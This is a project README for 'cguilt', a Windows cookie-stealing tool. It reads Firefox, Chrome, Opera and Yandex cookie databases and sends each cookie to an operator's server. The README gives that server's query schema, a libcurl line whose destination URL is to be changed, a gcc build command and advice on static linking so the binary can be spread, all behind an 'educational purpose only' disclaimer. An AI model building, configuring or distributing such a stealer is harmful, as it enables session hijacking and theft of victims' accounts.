# cguilt
Complete raw cookie stealer for MS Windows. Educational purpose only. Have runtime dependencies, such as `libcurl`. Binaries are not distributed for obvious reason. Also cookies are not decrypted for some reason, but I'm one hundred percent working on it. Maybe.

Working principe just pretty simple: first checks what browsers are currently installed on the local machine. There is only four variants for now *(Firefox, Chrome, Opera, Yandex)*, then reads their cookie file databases and sends content to your server through API requests. Really simple, huh.

If you want to build your own binary, click ![here](#build). You also you need a serverside to accept incoming POST requests with some query params in it. To check the template of imcoming params, click ![here](#query-template).

## query template
In incoming API requests query schema has three parametrs:
1. `host`. Cookie host value. Cguilt sending cookies one-by-one, so the one request is the one cookie pair. String, max 128 chars long.
2. `value`. Cookies content value. String, max 1024 chars long.
3. `b_type`. Browser type. Not exactly every browsers here, but only Chromium in general (= 1) and Gecko (= 2).

## build
Install `libcurl` and `sqlite3` libs. Before compilation change destination server adress in 40th string in `send.c`:
```c
curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000/api_post");
```
Compile everything.
```bash
$ gcc -o <name> main.c send.c `pkg-config --cflags --libs sqlite3 libcurl`
```
Also *if you want to distribute your own binary, which I one hundred percent condemn* you need to link the `libcurl` library as static, because it's required in runtime.

## quo vadis?
As it is can be somehow comnsidered harmful, the main purpose of this thing is practice and education. There is no goal of anything else. If you got a bug or just want to help to improve this thing - you are always welcome. Send bugreports in issues. 
